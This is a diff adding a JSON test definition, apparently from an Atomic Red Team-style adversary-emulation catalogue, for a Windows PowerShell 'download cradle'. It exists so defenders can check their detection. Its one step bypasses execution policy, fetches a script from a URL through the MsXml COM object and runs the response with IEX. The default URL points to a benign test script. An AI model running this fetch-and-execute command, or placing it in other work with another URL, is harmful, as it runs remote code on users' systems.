@@ -1,0 +1,31 @@
+{
+  "id": "388a7340-dbc1-4c9d-8e59-b75ad8c6d5da",
+  "name": "Powershell MsXml COM object - with prompt",
+  "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "e3a0f856-a08b-4249-81be-b00a5be7920e",
+      "type": "execute-command",
+      "data": {
+        "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1059.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "url",
+      "type": "url",
+      "description": "url of payload to execute",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1"
+    }
+  ]
+}
